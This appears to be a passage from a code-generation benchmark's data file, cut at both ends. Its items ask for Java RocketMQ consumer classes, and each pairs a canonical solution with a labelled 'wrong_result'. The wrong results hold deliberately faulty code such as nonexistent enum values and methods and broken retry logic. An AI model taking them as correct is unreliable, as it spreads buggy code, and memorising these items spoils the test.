final String linkFilename)\n    {\n        final Path linkFile = new File(serviceDir, linkFilename).toPath();\n        if (serviceDir.equals(actualFile.getParentFile()))\n        {\n            try\n            {\n                Files.deleteIfExists(linkFile);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to remove old link file\", ex);\n            }\n        }\n        else\n        {\n            try\n            {\n                Files.write(\n                    linkFile,\n                    actualFile.getParent().getBytes(US_ASCII),\n                    StandardOpenOption.CREATE,\n                    StandardOpenOption.WRITE,\n                    StandardOpenOption.TRUNCATE_EXISTING);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to create link for mark file directory\", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class MarkFile implements AutoCloseable {\n    private final File markFile;\n    private final MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed;\n\n    public MarkFile(File markFile, boolean createNew, int version, int timestampFieldSize, int flags, long timeout, EpochClock clock, IntConsumer versionCallback, Consumer<String> errorCallback) {\n        this.markFile = markFile;\n        this.isClosed = new AtomicBoolean(false);\n        try {\n            FileChannel channel = FileChannel.open(markFile.toPath(), createNew ? StandardOpenOption.CREATE_NEW : StandardOpenOption.READ_WRITE);\n            long size = Math.max(channel.size(), (long) timestampFieldSize + 4);\n            channel.truncate(size);\n            mappedBuffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n            buffer = new UnsafeBuffer(mappedBuffer);\n            if (createNew) {\n                buffer.putInt(0, version);\n                buffer.putLong(timestampFieldSize, clock.currentTime());\n            } else {\n                int currentVersion = buffer.getInt(0);\n                if (currentVersion != version) {\n                    versionCallback.accept(currentVersion);\n                }\n                long storedTimestamp = buffer.getLong(timestampFieldSize);\n                if (clock.currentTime() - storedTimestamp > timeout) {\n                    errorCallback.accept(\"Timestamp expired\");\n                }\n            }\n        } catch (IOException e) {\n            errorCallback.accept(\"Failed to create/mark file: \" + e.getMessage());\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (mappedBuffer != null) {\n                    mappedBuffer.force();\n                    mappedBuffer.clear();\n                }\n                if (markFile != null) {\n                    markFile.delete();\n                }\n            } catch (Exception e) {\n                // Handle cleanup failure\n            }\n        }\n    }\n\n    public static MappedByteBuffer mapNewOrExistingMarkFile(File markFile, boolean createNew, int version, int timestampFieldSize, long timeout, long initialTimestamp, EpochClock clock, IntConsumer versionCallback, Consumer<String> errorCallback) {\n        try {\n            FileChannel channel = FileChannel.open(markFile.toPath(), createNew ? StandardOpenOption.CREATE_NEW : StandardOpenOption.READ_WRITE);\n            long size = Math.max(channel.size(), (long) timestampFieldSize + 4);\n            channel.truncate(size);\n            MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n            int currentVersion = buffer.getInt(0);\n            if (currentVersion != version) {\n                versionCallback.accept(currentVersion);\n            }\n            long storedTimestamp = buffer.getLong(timestampFieldSize);\n            if (clock.currentTime() - storedTimestamp > timeout) {\n                errorCallback.accept(\"Timestamp expired\");\n            }\n            return buffer;\n        } catch (IOException e) {\n            errorCallback.accept(\"Failed to map file: \" + e.getMessage());\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void ensureMarkFileLink(File source, File target, String linkName) {\n        try {\n            if (Files.exists(target.toPath())) {\n                Files.delete(target.toPath());\n            }\n            Files.createSymbolicLink(target.toPath(), source.toPath());\n        } catch (IOException e) {\n            // Handle symlink creation failure\n        }\n    }\n}"
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ ordered message consumer using the DefaultMQPushConsumer for push-based message consumption with ordered message processing.\n\nClass Description: The RocketMQOrderedConsumer class provides functionality to consume messages from RocketMQ in an ordered manner. It handles consumer initialization, topic subscription, message listening, and consumer lifecycle management. The class includes an inner class for ordered message processing.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The main consumer instance that handles message consumption from RocketMQ\n\nMethods:\n- RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) -> void - Constructor that initializes the consumer with NameServer address and consumer group\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerOrderly listener) -> void - Registers an ordered message listener for processing incoming messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n\nInner Class:\n- OrderedMessageListener: MessageListenerOrderly - Implements ordered message processing logic with consumeMessage method\n  - consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) -> ConsumeOrderlyStatus - Processes a batch of messages and returns consumption status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class RocketMQOrderedConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            System.out.printf(System.currentTimeMillis() + \",\" + Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeOrderlyStatus.SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQOrderedConsumer {\n    private DefaultMQPushConsumer consumer;\n    private MessageListenerOrderly messageListener;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        this.messageListener = new OrderedMessageListener();\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        this.messageListener = listener;\n    }\n\n    public void start() {\n        consumer.setMessageListener(messageListener);\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            for (MessageExt msg : msgs) {\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            return ConsumeOrderlyStatus.SUCCEED;\n        }\n    }\n}"
  },
  {
    "Task_id": 372,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously process messages from a specified topic, handling message consumption with retry logic for failed messages.\n\nClass Description: The PlanConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specific topic, processes incoming messages, and implements retry logic for failed message consumption. The consumer is configured to start automatically after bean initialization.\n\nAttributes:\n- consumerGroup: String - The consumer group name for the RocketMQ consumer, injected from properties\n- namesrvAddr: String - The NameServer address for RocketMQ, injected from properties\n- logger: Logger - SLF4J logger instance for logging messages and errors\n\nMethods:\n- defaultMQPushConsumer(): void - Initializes and starts the RocketMQ consumer. This method is automatically called after bean construction (@PostConstruct). It:\n  1. Creates a DefaultMQPushConsumer instance\n  2. Configures NameServer address\n  3. Subscribes to the specified topic with wildcard tag filter\n  4. Sets consumption offset strategy\n  5. Registers a concurrent message listener\n  6. Starts the consumer\n  The message listener processes messages, logs successful consumption, and implements retry logic (up to 3 attempts) for failed messages.\n\nInput: None (Configuration is injected via @Value annotations)\n\nOutput: None (The consumer runs continuously, processing messages as they arrive)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport top.lrshuai.mq.comment.Const;\nimport top.lrshuai.mq.test.entity.AccountPlan;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class PlanConsumer {\n\n    @Value(\"${apache.rocketmq.consumer.PushConsumer}\")\n    private String consumerGroup;\n\n    @Value(\"${apache.rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n\n    private Logger logger = LoggerFactory.getLogger(this.getClass());\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        try {\n            consumer.subscribe(Const.PLAN_TOPIC, \"*\");\n            consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n            consumer.registerMessageListener((MessageListenerConcurrently) (list, context) -> {\n                MessageExt tempMsg = null;\n                try {\n                    for (MessageExt msg : list) {\n                        tempMsg = msg;\n                        String messageBody = new String(msg.getBody(), \"utf-8\");\n                        AccountPlan plan = JSON.parseObject(messageBody, AccountPlan.class);\n                        logger.info(\"\u6d88\u8d39\u6210\u529f\uff1amsgId={}\uff0cplan={}\", msg.getMsgId(), plan);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                    if(tempMsg.getReconsumeTimes() == 3) {\n                        logger.error(\"msg consume error by:{}\", tempMsg);\n                        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                    }\n                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            });\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "@Component\npublic class PlanConsumer {\n\n    @Value(\"${rocketmq.consumerGroup}\")\n    private String consumerGroup;\n\n    @Value(\"${rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic}\")\n    private String topic;\n\n    private static final Logger logger = LoggerFactory.getLogger(PlanConsumer.class);\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topic, \"*\");\n        consumer.setConsumeFromWhere(org.apache.rocketmq.common.protocol.consumption.ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (Message msg : msgs) {\n                int retryCount = 0;\n                boolean processed = false;\n                while (retryCount < 3 && !processed) {\n                    try {\n                        logger.info(\"Processing message: {}\", new String(msg.getBody()));\n                        // Simulate message processing\n                        if (Math.random() > 0.5) {\n                            throw new RuntimeException(\"Simulated failure\");\n                        }\n                        processed = true;\n                        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                    } catch (Exception e) {\n                        logger.error(\"Failed to process message: {}\", new String(msg.getBody()), e);\n                        retryCount++;\n                        if (retryCount < 3) {\n                            logger.info(\"Retrying message (Attempt {}): {}\", retryCount, new String(msg.getBody()));\n                            try {\n                                Thread.sleep(1000);\n                            } catch (InterruptedException ex) {\n                                Thread.currentThread().interrupt();\n                            }\n                        } else {\n                            logger.warn(\"Max retries reached for message: {}\", new String(msg.getBody()));\n                        }\n                    }\n                }\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        consumer.start();\n    }\n}"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class that sets up a RocketMQ push consumer (`DefaultMQPushConsumer`). It configures the consumer with NameServer address, consumption strategy, topic subscriptions with tags, and registers a message listener. The consumer is started asynchronously after a delay.\n\nAttributes:\n- `paascloudProperties`: [PaascloudProperties] - Contains configuration properties for the RocketMQ consumer, including NameServer address and consumer group.\n- `optPushConsumer`: [OptPushMessageListener] - The message listener implementation that handles incoming messages.\n- `taskExecutor`: [TaskExecutor] - Executor service used to start the consumer asynchronously.\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer. Sets the NameServer address, consumption strategy, subscribes to topics with tags, registers the message listener, and starts the consumer asynchronously after a delay. Throws `MQClientException` if there's an error in consumer configuration.\n\nThe class follows Spring's dependency injection pattern and uses `@Bean` to expose the consumer instance to the Spring context. The consumer is started in a separate thread to avoid blocking the main application startup.",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.consumer.listener.OptPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.core.task.TaskExecutor;\n\nimport javax.annotation.Resource;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private OptPushMessageListener optPushConsumer;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.OPT.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(optPushConsumer);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                e.printStackTrace();\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "@Configuration\npublic class AliyunMqConfiguration {\n\n    @Autowired\n    private PaascloudProperties paascloudProperties;\n\n    @Autowired\n    private OptPushMessageListener optPushConsumer;\n\n    @Autowired\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getNamesrvAddr());\n\n        consumer.subscribe(paascloudProperties.getTopic(), paascloudProperties.getTag());\n        consumer.registerMessageListener(optPushConsumer);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (MQClientException | InterruptedException e) {\n                throw new RuntimeException(\"Failed to start RocketMQ consumer\", e);\n            }\n        });\n\n        return consumer;\n    }\n}"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: Implement a RocketMQ consumer class that handles message consumption from a Logical Message Queue (LMQ) using POP mode, with proper initialization, message processing, and cleanup functionality.\n\nClass Description: LMQPushPopConsumer is a Java class that demonstrates how to consume messages from a RocketMQ Logical Message Queue (LMQ) using POP (Pull-on-Poll) mode. It handles consumer initialization, topic subscription, message processing, and resource cleanup.\n\nAttributes:\n- CLUSTER_NAME: [String] - The name of the RocketMQ cluster\n- BROKER_NAME: [String] - The name of the target broker\n- TOPIC: [String] - The parent topic name\n- LMQ_TOPIC: [String] - The Logical Message Queue topic name (prefixed with LMQ_PREFIX)\n- NAMESRV_ADDR: [String] - The NameServer address\n- CONSUMER_GROUP: [String] - The consumer group name\n- BROKER_ADDR_MAP: [HashMap<Long, String>] - Mapping of broker IDs to their addresses\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n- mqAdminExt: [DefaultMQAdminExt] - The RocketMQ admin tool instance\n\nMethods:\n- initializeConsumer(): [void] -> [void] - Initializes the consumer by setting up POP mode, configuring consumer properties, subscribing to the topic, and registering a message listener\n- switchPop(): [void] -> [void] - Configures the broker to use POP mode for message consumption\n- shutdown(): [void] -> [void] - Shuts down the consumer and admin instances to release resources",
    "Canonical_solution": "import com.google.common.collect.Lists;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.MessageRequestMode;\nimport org.apache.rocketmq.remoting.protocol.route.BrokerData;\nimport org.apache.rocketmq.remoting.protocol.route.TopicRouteData;\nimport org.apache.rocketmq.tools.admin.DefaultMQAdminExt;\n\npublic class LMQPushPopConsumer {\n    public static final String CLUSTER_NAME = \"DefaultCluster\";\n    public static final String BROKER_NAME = \"broker-a\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String LMQ_TOPIC = MixAll.LMQ_PREFIX + \"456\";\n    public static final String NAMESRV_ADDR = \"127.0.0.1:9876\";\n    public static final String CONSUMER_GROUP = \"CID_LMQ_POP_1\";\n    public static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<Long, String>() {\n        {\n            put(MixAll.MASTER_ID, \"127.0.0.1:10911\");\n        }\n    };\n\n    private DefaultMQPushConsumer consumer;\n    private DefaultMQAdminExt mqAdminExt;\n\n    public void initializeConsumer() throws Exception {\n        switchPop();\n\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.setClientRebalance(false);\n        consumer.start();\n\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().updateTopicRouteInfoFromNameServer(TOPIC);\n\n        final TopicRouteData topicRouteData = new TopicRouteData();\n        final BrokerData brokerData = new BrokerData();\n        brokerData.setCluster(CLUSTER_NAME);\n        brokerData.setBrokerName(BROKER_NAME);\n        brokerData.setBrokerAddrs(BROKER_ADDR_MAP);\n        topicRouteData.setBrokerDatas(Lists.newArrayList(brokerData));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().getTopicRouteTable().put(LMQ_TOPIC, topicRouteData);\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().doRebalance();\n    }\n\n    private void switchPop() throws Exception {\n        mqAdminExt = new DefaultMQAdminExt();\n        mqAdminExt.setNamesrvAddr(NAMESRV_ADDR);\n        mqAdminExt.start();\n        List<BrokerData> brokerDatas = mqAdminExt.examineTopicRouteInfo(TOPIC).getBrokerDatas();\n        for (BrokerData brokerData : brokerDatas) {\n            Set<String> brokerAddrs = new HashSet<>(brokerData.getBrokerAddrs().values());\n            for (String brokerAddr : brokerAddrs) {\n                mqAdminExt.setMessageRequestMode(brokerAddr, LMQ_TOPIC, CONSUMER_GROUP, MessageRequestMode.POP, 8,\n                    3_000);\n            }\n        }\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n        if (mqAdminExt != null) {\n            mqAdminExt.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class LMQPushPopConsumer {\n    private String CLUSTER_NAME;\n    private String BROKER_NAME;\n    private String TOPIC;\n    private String LMQ_TOPIC;\n    private String NAMESRV_ADDR;\n    private String CONSUMER_GROUP;\n    private HashMap<Long, String> BROKER_ADDR_MAP;\n    private DefaultMQPushConsumer consumer;\n    private DefaultMQAdminExt mqAdminExt;\n\n    public void initializeConsumer() {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (Message msg : msgs) {\n                // Process message\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void switchPop() {\n        mqAdminExt = new DefaultMQAdminExt();\n        mqAdminExt.setNamesrvAddr(NAMESRV_ADDR);\n        mqAdminExt.start();\n        String brokerAddr = BROKER_ADDR_MAP.get(1L);\n        if (brokerAddr != null) {\n            consumer.setBrokerAddr(brokerAddr);\n        }\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n        if (mqAdminExt != null) {\n            mqAdminExt.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with Spring integration capabilities, allowing for configuration through properties and proper lifecycle management.\n\nClass Description: The Consumer class is a Spring FactoryBean that creates and manages a RocketMQ DefaultMQPushConsumer instance. It implements InitializingBean for initialization and DisposableBean for cleanup, providing a convenient way to integrate RocketMQ consumers into Spring applications. The class offers extensive configuration options for consumer behavior and performance tuning.\n\nAttributes:\n\nconsumerGroup: String - The consumer group name for this consumer\nnamesrvAddr: String - The address of the NameServer\ninstanceName: String - The instance name for this consumer\nmessageModel: MessageModel - The message model (CLUSTERING or BROADCASTING)\nconsumeThreadMin: int - Minimum thread pool size for message consumption\nconsumeThreadMax: int - Maximum thread pool size for message consumption\npullThresholdForQueue: int - Flow control threshold for queue\npullThresholdSizeForQueue: int - Flow control threshold for queue size\nconsumeMessageBatchMaxSize: int - Maximum number of messages consumed in one batch\npullBatchSize: int - Maximum number of messages pulled in one batch\nmaxReconsumeTimes: int - Maximum number of retry attempts\nconsumeTimeout: long - Timeout for message consumption\ntopic: String - The topic to subscribe to\ntags: String - The tag filter for subscribed messages\nmessageListener: MessageListenerConcurrently - The listener for processing received messages\nconsumer: DefaultMQPushConsumer - The actual RocketMQ consumer instance\n\nMethods:\n\nafterPropertiesSet(): void - Initializes and starts the consumer after properties are set (from InitializingBean)\ndestroy(): void - Shuts down the consumer when the Spring context is destroyed (from DisposableBean)\ngetObject(): DefaultMQPushConsumer - Returns the consumer instance (from FactoryBean)\ngetObjectType(): Class<?> - Returns the consumer class type (from FactoryBean)\nisSingleton(): boolean - Indicates this is a singleton bean (from FactoryBean)\nsetConsumerGroup(String): void - Sets the consumer group name\nsetNamesrvAddr(String): void - Sets the NameServer address\nsetInstanceName(String): void - Sets the instance name\nsetMessageModel(String): void - Sets the message model\nsetConsumeThreadMin(int): void - Sets minimum consumption threads\nsetConsumeThreadMax(int): void - Sets maximum consumption threads\nsetPullThresholdForQueue(int): void - Sets queue flow control threshold\nsetPullThresholdSizeForQueue(int): void - Sets queue size flow control threshold\nsetConsumeMessageBatchMaxSize(int): void - Sets batch consumption size\nsetPullBatchSize(int): void - Sets pull batch size\nsetMaxReconsumeTimes(int): void - Sets maximum retry attempts\nsetConsumeTimeout(long): void - Sets consumption timeout\nsetTopic(String): void - Sets subscription topic\nsetTags(String): void - Sets message tag filter\nsetMessageListener(MessageListenerConcurrently): void - Sets the message listener",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.beans.factory.FactoryBean;\nimport org.springframework.beans.factory.InitializingBean;\n\npublic class Consumer implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n\n    private DefaultMQPushConsumer consumer;\n\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName;\n    private MessageModel messageModel = MessageModel.CLUSTERING;\n    private int consumeThreadMin = 20;\n    private int consumeThreadMax = 64;\n    private int pullThresholdForQueue = 1000;\n    private int pullThresholdSizeForQueue = 100;\n    private int consumeMessageBatchMaxSize = 1;\n    private int pullBatchSize = 32;\n    private int maxReconsumeTimes = -1;\n    private long consumeTimeout = 15;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setInstanceName(instanceName);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setMessageModel(messageModel);\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setConsumeMessageBatchMaxSize(consumeMessageBatchMaxSize);\n        consumer.setPullBatchSize(pullBatchSize);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout(consumeTimeout);\n        consumer.subscribe(topic, tags);\n        consumer.registerMessageListener(messageListener);\n        consumer.start();\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() throws Exception {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        this.messageModel = MessageModel.valueOf(messageModel);\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
